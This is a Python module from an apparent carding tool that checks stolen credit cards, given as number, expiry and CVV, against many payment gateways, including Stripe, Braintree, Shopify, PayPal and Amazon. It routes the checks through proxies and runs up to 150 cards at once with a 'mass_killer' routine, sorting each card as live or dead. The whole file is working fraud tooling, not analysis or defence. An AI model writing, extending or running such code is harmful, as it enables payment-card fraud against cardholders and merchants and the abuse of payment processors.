import asyncio
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Tuple
import time
import random
# from gates import ( ... ) - MOVED TO get_gates() to fix circular import
from config import get_proxy

def get_gates() -> List[Tuple[str, callable]]:
    from gates import (
        check_stripe, check_braintree, check_razorpay, 
        check_shopify, check_payu, check_amazon, 
        check_autohitter, check_nmi, check_payflow,
        check_shopify_auth, check_vbv, check_paypal, check_autowoo,
        check_paypal_avs
    )
    return [
        ("Stripe Auth v5.0", check_stripe),
        ("Braintree v6.0", check_braintree),
        ("Razorpay v2.0", check_razorpay),
        ("Shopify v4.0", check_shopify),
        # ("PayU v1.0", check_payu),
        ("Amazon Auth v1.0", check_amazon),
        ("Autohitter v2.0", check_autohitter),
        ("NMI Charge v1.0", check_nmi),
        ("Payflow Pro v1.0", check_payflow),
        ("Shopify Auth v2.0", check_shopify_auth),
        ("VBV Pro v1.0", check_vbv),
        ("PayPal 1$ CVV", check_paypal),
        ("PayPal Key AVS", check_paypal_avs),
        ("WooStripe v1.0", check_autowoo)
    ]

executor = ThreadPoolExecutor(max_workers=100)

def get_random_proxy():
    """Returns a random proxy from config if available."""
    proxy = get_proxy()
    if not proxy:
        return None
    # If it's a list/file, we would rotate. For now, use the single URL.
    return proxy

async def run_all_gates(card_data: tuple) -> Dict:
    """Run gates parallel with proxy support."""
    cc, mm, yy, cvv = card_data
    bin6 = cc[:6]
    proxy = get_random_proxy()
    
    tasks = []
    # Optimization: Run top 3 gates in parallel for speed
    tasks = []
    # Optimization: Run top 3 gates in parallel for speed
    gates_list = get_gates()
    for name, gate_func in gates_list[:3]:
        tasks.append(gate_func(cc, mm, yy, cvv, proxy))
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for i, res in enumerate(results):
        if isinstance(res, dict) and res.get("status") in ["approved", "live", "success", "charged"]:
            res["bin"] = bin6
            res["card"] = cc
            return res
            
    return {"status": "dead", "response": "All gates declined", "bin": bin6, "card": cc, "gate": "None"}

async def mass_killer(cards: list, status_callback=None):
    semaphore = asyncio.Semaphore(150) # Turbo speed: 150 parallel
    results = {}
    
    async def check_one(card):
        async with semaphore:
            res = await run_all_gates(card)
            results[card[0]] = res
            if status_callback:
                await status_callback(len(results), len(cards))
            return res
            
    tasks = [check_one(card) for card in cards]
    await asyncio.gather(*tasks)
    return results

async def mass_specific_gate_runner(cards: list, gate_func: callable, status_callback=None):
    """Run ONE specific gate on mass cards."""
    semaphore = asyncio.Semaphore(50) # Slightly lower concurrency for single gate abuse safety
    results = {}
    
    async def check_one(card):
        async with semaphore:
            cc, mm, yy, cvv = card
            proxy = get_random_proxy()
            # Gate func signature usually: (cc, mm, yy, cvv, proxy)
            # Some might have variable args, but standard gates follow this.
            # We assume gate_func is compatible.
            try:
                if "check_stripe_autohitter_url" in str(gate_func):
                     # Special case for hitter if needed, but usually hitter isn't mass checked without URL
                     # For now assume standard signature
                     res = await gate_func(cc, mm, yy, cvv, proxy)
                else:
                    res = await gate_func(cc, mm, yy, cvv, proxy)
            except Exception as e:
                res = {"status": "error", "response": str(e), "gate": "Error"}
            
            # Formating result to match mass_killer output structure
            if not isinstance(res, dict): res = {"status": "error", "response": "Invalid format"}
            
            res["card"] = card[0]
            res["bin"] = card[0][:6]
            
            results[card[0]] = res
            if status_callback:
                await status_callback(len(results), len(cards))
            return res

    tasks = [check_one(card) for card in cards]
    await asyncio.gather(*tasks)
    return results

print("[OK] API_KILLER REFACTORED | Proxy & Turbo enabled")
